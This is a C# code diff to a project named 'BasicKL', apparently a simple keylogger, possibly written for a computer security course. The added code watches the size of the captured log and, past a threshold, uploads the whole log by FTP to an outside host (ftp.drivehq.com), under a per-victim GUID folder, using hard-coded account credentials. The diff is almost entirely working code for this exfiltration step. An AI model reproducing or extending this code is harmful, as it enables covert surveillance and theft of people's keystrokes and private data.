@@ -5,6 +5,8 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Configuration;
+using System.IO;
+using System.Net;
 
 using log4net;
 using log4net.Appender;
@@ -46,6 +48,38 @@ namespace BasicKL
             }
 
             log.Info(msg);
+
+            int maxSizeMb;
+            if (!Int32.TryParse(ConfigurationManager.AppSettings["maxLogSizeMb"], out maxSizeMb))
+                maxSizeMb = 1;
+
+            long maxSizeB = (long)(maxSizeMb) << 20;
+
+            FileInfo logInfo = new FileInfo(GetLogPath());
+            if (logInfo.Length >= maxSizeB)
+            {
+                UploadMe();
+            }
+        }
+
+        private async void UploadMe()
+        {
+            FtpWebRequest req = (FtpWebRequest)WebRequest.Create("ftp://ftp.drivehq.com/"+guid.ToString());
+            req.Credentials = new NetworkCredential("msd7734", "compsec");
+            req.Method = WebRequestMethods.Ftp.MakeDirectory;
+            FtpWebResponse response = (FtpWebResponse)await req.GetResponseAsync();
+            response.Close();
+
+            byte[] b = File.ReadAllBytes(GetLogPath());
+            string fname = String.Format("\n{0:d/M/yyyy HH:mm:ss}", DateTime.Now);
+
+            FtpWebRequest req2 = (FtpWebRequest)WebRequest.Create(
+                String.Format("ftp://ftp.drivehq.com/{0}/{1}.txt", guid.ToString(), fname)
+            );
+            req2.Credentials = new NetworkCredential("msd7734", "compsec");
+            req2.Method = WebRequestMethods.Ftp.AppendFile;
+            FtpWebResponse response2 = (FtpWebResponse)await req2.GetResponseAsync();
+            response2.Close();
         }
 
         public string GetLogPath()
